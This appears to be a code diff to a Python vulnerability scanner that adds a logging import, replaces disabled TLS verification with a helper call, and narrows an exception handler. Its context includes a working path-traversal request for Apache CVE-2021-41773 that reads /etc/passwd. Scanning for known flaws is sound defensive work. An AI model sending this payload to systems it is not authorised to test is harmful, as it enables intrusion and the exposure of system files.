@@ -7,6 +7,7 @@ import sys
 from concurrent.futures import ThreadPoolExecutor
 import struct
 import time
+import logging
 
 class VulnScanner:
     def __init__(self, target, timeout=10):
@@ -46,7 +47,7 @@ class VulnScanner:
         try:
             # Test for Apache CVE-2021-41773
             url = f"http://{self.target}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-            response = requests.get(url, timeout=self.timeout, verify=False)
+            response = requests.get(url, timeout=self.timeout, verify=_ssl_verify())
             
             if "root:" in response.text:
                 print(f"[+] VULNERABLE: Apache Path Traversal (CVE-2021-41773) on {self.target}:{port}")
@@ -132,7 +133,7 @@ class VulnScanner:
             result = sock.connect_ex((self.target, port))
             sock.close()
             return result == 0
-        except:
+        except Exception:
             return False
 
     def scan_all_vulns(self, port=None):
